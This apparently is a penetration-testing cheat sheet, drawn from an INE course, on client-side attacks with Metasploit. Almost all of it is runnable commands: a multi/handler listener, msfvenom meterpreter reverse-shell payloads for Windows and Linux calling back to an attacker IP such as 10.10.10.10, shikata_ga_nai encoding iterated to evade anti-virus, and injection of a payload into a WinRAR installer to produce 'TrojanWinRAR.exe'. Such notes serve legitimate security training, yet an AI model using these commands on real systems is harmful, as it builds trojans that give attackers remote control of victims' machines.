# Client-Side Attacks

* [msfconsole listener](#msfconsole-listener)
* [Generating Payloads With Msfvenom](#generating-payloads-with-msfvenom)
* [Encoding Payloads With Msfvenom](#encoding-payloads-with-msfvenom)
* [Injecting Payloads Into Windows Portable Executables](#injecting-payloads-into-windows-portable-executables)
* [Automation](#automation)
* [References](#references)

***********************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
***********************************************************************

* Client-Side attacks require human interaction and does not take advantage of services on the target system.
* Be mindful of anti-virus on client system.

## msfconsole listener

```
use multi/handler
```
```
set payload [PAYLOAD]
```
Windows x86 Example:
```
set payload windows/meterpreter/reverse_tcp
```
```
show options
```
```
set LHOST [ATTACK-IP]
```
```
set LPORT [PORT]
```
```
run
```
* Now execute payload on client system to get a meterpreter shell 

***********************************************************************

## Generating Payloads With Msfvenom

* Msfvenom is a combination of msfpayload and msfencode.
* Msfvenom is used to generate malicious meterpreter payload that can be transfered to target system and connects back to attacker.  

List payloads:
```
msfvenom --list payloads
```

List outfile formats:
```
msfvenom --list formats
```

### Windows

Staged payload example:
```
windows/x64/meterpreter/reverse_http
```
Un-staged payload example:
```
windows/x64/meterpreter_reverse_http
```

64 bit architecture example: 
```
windows/x64/meterpreter/reverse_http
```

```
windows/meterpreter/reverse_http
```

Generate payload examples:
```
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=[ATTACK-IP] LPORT=[PORT] -f exe > [OUTFILE]
```
```
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=[ATTACK-IP] LPORT=[PORT] -f exe > [OUTFILE]
```
* ensure file extension is specified in the [OUTFILE]
* -f is the format, and you can use other extensions that are not .exe depending on the use-case.

### Linux

32 bit (x86) architecture example:
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[ATTACK-IP] LPORT=[PORT] -f elf > [OUTFILE]
```
64 bit architecture example:
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[ATTACK-IP] LPORT=[PORT] -f elf > [OUTFILE]
```

***********************************************************************

## Encoding Payloads With Msfvenom

List encoders:
```
msfvenom --list encoders
```

### Windows

Encode payload examples:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACK-IP] LPORT=[PORT] -e [ENCODER] -f exe > [OUTFILE]
```
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -e x86/shikata_ga_nai -f exe > Desktop/encoded_payload.exe
```
* Note the number of iterations for the encoder in the terminal output after running the command:
   * "Attempting to encode payload with 1 iterations of x86/shikata_ga_nai"
   * You can encode a payload multiple times, the more encoding iterations of the payload, the greater the chance you have to bypass anti-virus detection. 
   * use "-i [#]" after "LPORT" to set the amount of iterations:
   ```
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACK-IP] LPORT=[PORT] -i [#] -e [ENCODER] -f exe > [OUTFILE]
   ```
   ```
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > Desktop/encoded_payload.exe
   ```
   * Suggest not going over 10 iterations because of the law of diminishing returns.

### Linux

Encode payload examples:
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[ATTACK-IP] LPORT=[PORT] -i [#] -e [ENCODER] -f elf > [OUTFILE]
```
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > Desktop/encoded_payload
```

* Now transfer encoded payload to target machine, start a meterpreter listener, and execute the payload from the target machine.

***********************************************************************

## Injecting Payloads Into Windows Portable Executables

* Not all executables are able to have payloads injected into them.
* WinRAR is a good executable to inject payload into.

Examples:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACK-IP] LPORT=[PORT] -e [ENCODER] -f exe -x [EXE-TO-INJECT] > [OUTFILE]
```
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -e x86/shikata_ga_nai -f exe -x ~/Downloads/wrar602.exe > Desktop/TrojanWinRAR.exe
```
* Now transfer encoded payload to target machine, start a meterpreter listener, and execute the payload from the target machine.

The -k option maintains the original functionality of the executable, however it's not always reliable, much testing needs to be done to get this to work:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACK-IP] LPORT=[PORT] -e [ENCODER] -f exe -k -x [EXE-TO-INJECT] > [OUTFILE]
```

You can migrate into a new process by entering:
```
run post/windows/manage/migrate
```

***********************************************************************

## Automation

Set up a resource script (.rc):
* Put commands in a .rc file in sequential order

From outside msfconsole:
```
msfconsole -r [SCRIPT.rc]
```

From inside msfconsoel:
```
resource [PATH-TO-.rc-FILE]
```

Make a .rc from last commands used in msfconsole:
```
makerc [OUTFILE]
```

***********************************************************************

### References
Penetration Tester Student v2 by INE  
https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student-v2